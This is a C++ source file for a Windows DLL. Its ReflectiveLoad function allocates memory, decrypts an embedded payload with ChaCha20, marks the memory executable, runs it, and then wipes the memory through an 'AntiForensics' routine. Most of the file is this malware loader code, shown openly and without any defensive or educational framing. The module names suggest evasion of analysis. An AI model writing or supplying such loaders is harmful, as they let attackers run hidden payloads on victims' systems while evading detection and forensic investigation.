#include <Windows.h>
#include <winternl.h>
#include "SafetyProtocols.h"

#define PAGE_SIZE 0x1000

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        SafetyProtocols::PreExecutionCheck();
        // ... - here rest of initialization
    }
    return TRUE;
}

__declspec(noinline) BOOL ReflectiveLoad(LPVOID lpPayload, SIZE_T payloadSize) {
    HANDLE hProcess = GetCurrentProcess();
    PVOID pRemoteBuffer = nullptr;
    SIZE_T sSize = payloadSize;

    NTSTATUS status = NtAllocateVirtualMemory(
        hProcess,
        &pRemoteBuffer,
        0,
        &sSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) return FALSE;

    memcpy(pRemoteBuffer, lpPayload, payloadSize);
    Cryptor::ChaCha20_Decrypt(
        static_cast<BYTE*>(pRemoteBuffer),
        payloadSize,
        KeyManager::GetActiveKey(),
        KeyManager::GetNonce(),
        1
    );

    ULONG oldProtect;
    status = NtProtectVirtualMemory(
        hProcess,
        &pRemoteBuffer,
        &sSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (!NT_SUCCESS(status)) {
        VirtualFree(pRemoteBuffer, 0, MEM_RELEASE);
        return FALSE;
    }

    __try {
        ((void(*)())pRemoteBuffer)();
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }

    AntiForensics::WipeMemory(pRemoteBuffer, payloadSize);
    VirtualFree(pRemoteBuffer, 0, MEM_RELEASE);
    return TRUE;
}
